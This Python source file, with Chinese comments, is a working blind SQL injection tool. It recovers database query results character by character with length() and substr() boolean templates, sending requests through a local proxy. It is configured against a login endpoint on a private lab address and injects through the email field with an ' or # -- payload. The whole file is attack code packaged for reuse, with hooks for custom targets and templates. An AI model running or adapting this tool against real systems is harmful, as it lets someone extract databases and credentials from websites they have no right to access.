'''
Author: yhh
Date: 2022-10-19 14:25:23
LastEditTime: 2022-10-20 10:24:58
LastEditors: yhh
Description: 
FilePath: \SQL注入\Blind_inject.py
yhh
'''
import json
import requests

"""
作者：马朴涵_yhh修改
时间：2022.10.14
功能：sql盲注工具，可以用来进行sql盲注
版本：1.0。目前查询速度过慢，不支持中文查询，后续版本将进行频率+二分查找，单词预测，多线程等进行优化。
对外接口，以下接口需要使用者手动实现：
dict        getProxy():              在其中自定义代理
dict        getHeader()：            在其中自定义返回header
charList    getCharset()：           在其中返回盲注时尝试的字符集合
bool        isDiffrent(res)：        返回盲注成功时候的不同点
string      getPostDataTemple():     返回post数据模板
string      getUrlTemplet():                返回url模板
string      getTimesInjectionTemplet():     返回获得注入语句长度的模板
string      getDataInjectionTemplet():      返回获得注入语句内容的模板
string      getResMethod():                 返回注入方法

使用逻辑说明：
如果要用get方法盲注：
    在urltemplet中设置url，get参数，以及注入点，其中#表示注入点，此注入点中会传入经过经过模板解析过的注入语句，
    有两种注入模板，一种是获得获得语句执行长度，一种是获得语句执行内容。
    语句执行长度模板中%s表示变化内容点，第一个为执行语句，第二个为长度
    语句执行内容模板中%s表示变化内容点，第一个为执行语句，第二个为判断位置，第三个为尝试字符

如果要用post方法盲注：
    在urltempet中设置url，在getPostdataTemplet中设置post数据和注入点，其中注入点使用#表示注入点，注入模板设置同get方法
"""


# 获得目标执行语句的长度
def getLength(injectionStatement):
    for i in range(1, 10000):
        # 在此中传入的参数会给到次数模板中
        res = getRes('times', [injectionStatement, str(i)])
        if isDiffrent(res):
            return i
        if i % 10 == 0:
            print("length test:" + str(i))
    print("get length error")
    return -1


# 获得目标执行语句的结果
def getResOfInjection(injectionStatement):
    length = getLength(injectionStatement)
    if length == -1:
        return ""
    print("length=" + str(length))
    injectionRes = ""
    charsetFlag = True
    charSet = getCharset()
    for i in range(0, length):
        flag = False
        for s in charSet:
            # 在此处传入的函数会给到数据模板中
            res = getRes('data', [injectionStatement, str(i + 1), s])
            if isDiffrent(res):
                injectionRes = injectionRes + s
                flag = True
                break
        if flag == False:
            injectionRes += "?"
            charsetFlag = False
        if (i + 1) % 5 == 0 and i != 0:
            print("process: " + str(i + 1) + "/" + str(length) + "  already_get: " + injectionRes)
    if charsetFlag:
        print("ok,injectionRes:" + injectionRes)
        return injectionRes
    print("result:  " + injectionRes + "\nGet result error,check your charset,the unknown char is marked as ?")
    return injectionRes


# 通过方法和参数列表获得执行结果
def getRes(flag, varList):
    method = getResMethod()
    wholeInjectionByTemplet = getWholeInjectionByTemplet(getInjectionTemplet(flag), varList)
    if method == "get":
        url = getUrlTemplet().replace("#", wholeInjectionByTemplet)
        res = requests.get(url, headers=getHeader(), proxies=getProxy())
        return res
    elif method == "post":
        url = getUrlTemplet().replace("#", "")
        dataJson = getPostDataTemple().replace("#", wholeInjectionByTemplet)
        data = json.loads(dataJson)
        res = requests.post(url=url, json=data, headers=getHeader(), proxies=getProxy())
        return res


# 通过模板和参数列表返回模板解析后的结果
def getWholeInjectionByTemplet(templet, varList):
    if templet.count("%s") != len(varList):
        print("templet error")
        print(templet, varList)
    return templet % tuple(varList)


# 获得语句模板
def getInjectionTemplet(flag):
    if flag == 'times':
        return getTimesInjectionTemplet()
    else:
        return getDataInjectionTemplet()


# ==========================以下为自定义接口============================================
def getProxy():
    return {'http': 'http://127.0.0.1:8080'}


def getHeader():
    rawHeaders = """
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 133
Origin: http://192.168.1.242:3000
Connection: close
Referer: http://192.168.1.242:3000/
"""
    dic = {}
    for line in rawHeaders.split("\n"):
        dic[line.split(": ", 1)[0]] = line.split(": ", 1)[1]
    return dic


# 如果是post方法，需要在其中自定义参数对象，#代表注入点
def getPostDataTemple():
    return json.dumps({"email": "123@qq.com' or #-- ", "password": "12345wefwe"})


# 如果get方法，其中#代表注入点
def getUrlTemplet():
    return 'http://192.168.1.242:3000/rest/user/login'


def getTimesInjectionTemplet():
    return "(length((%s))=%s)"


def getDataInjectionTemplet():
    return "(substr((%s),%s,1)='%s')"


def getResMethod():
    return "post"


def isDiffrent(res):
    # user define it
    return res.status_code == 200


def getCharset():
    charsetList = []
    for i in list(range(ord('a'), ord('z') + 1)) + list(range(ord('A'), ord('Z') + 1)):
        charsetList.append(chr(i))
    for i in range(32, 127):
        if i != ord('"') and i != ord("'") and i != ord('#') and i != ord('\\') and not chr(i) in charsetList:
            charsetList.append(chr(i))
    return charsetList


if __name__ == '__main__':
    while 1:
        getResOfInjection(input("input injection statement"))
